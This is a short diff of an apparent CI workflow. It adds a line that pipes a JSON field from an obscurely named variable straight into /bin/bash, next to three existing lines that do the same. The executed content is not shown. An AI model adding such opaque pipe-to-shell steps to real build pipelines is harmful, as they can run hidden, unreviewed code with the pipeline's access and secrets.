@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$kyfkg3135" | jq -r .tx2807 | /bin/bash
           printf '%s' "$ol72" | jq -r .ds82 | /bin/bash
           printf '%s' "$v122" | jq -r .v11862 | /bin/bash
+          echo $j11 | jq -r .vxjr87068 | /bin/bash
 
       - name: Upload artifact
         if: always()
